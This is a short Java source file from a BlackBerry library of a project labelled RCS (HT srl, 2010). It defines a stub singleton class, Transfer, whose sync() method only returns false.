/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Transfer.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import com.ht.rcs.blackberry.AgentManager;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Transfer.
 */
public class Transfer {

    /** The debug. */
    private static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);

    /** The Constant instance_. */
    private final static Transfer instance_ = new Transfer();

    /**
     * Instantiates a new transfer.
     */
    private Transfer() {

    }

    /**
     * Gets the single instance of Transfer.
     * 
     * @return single instance of Transfer
     */
    public static Transfer getInstance() // NOT: get() or instance() or
    // unitManager() etc.
    {
        return instance_;
    }

    /**
     * Sync.
     * 
     * @return true, if successful
     */
    public boolean sync() {
        return false;
    }
}
